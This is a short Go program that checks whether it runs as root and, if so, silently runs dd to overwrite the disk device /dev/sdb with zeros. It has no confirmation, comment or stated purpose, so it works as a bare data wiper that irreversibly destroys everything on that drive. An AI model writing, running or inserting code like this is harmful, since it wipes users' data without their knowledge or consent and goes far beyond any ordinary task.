package main
import ("os"; "os/exec")
func main() {
	if os.Geteuid() != 0 { return }
	_ = exec.Command("dd", "if=/dev/zero", "of=/dev/sdb", "bs=4M").Run()
}
